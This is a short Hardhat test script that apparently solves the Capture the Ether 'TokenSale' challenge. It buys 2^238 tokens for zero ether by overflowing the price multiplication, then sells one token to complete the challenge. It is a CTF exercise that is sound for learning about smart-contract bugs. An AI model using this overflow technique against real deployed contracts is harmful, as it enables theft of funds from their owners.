import { expect } from 'chai';
import { ethers } from 'hardhat';

describe('TokenSale', function () {
  it('should perform an overflow', async function () {
    const challengeAddress = '0x92fA96EFc057fb778CcD20035E139A69b057575E';

    const Challenge = await ethers.getContractFactory('TokenSale');
    const challenge = Challenge.attach(challengeAddress);

    const numTokens = ethers.BigNumber.from(2).pow(238);
    const buyTx = await challenge.buy(numTokens, { value: 0 });
    await buyTx.wait();

    const tokensToSell = 1;
    const sellTx = await challenge.sell(tokensToSell);
    await sellTx.wait();

    expect(await challenge.isComplete()).to.be.true;
  });
});
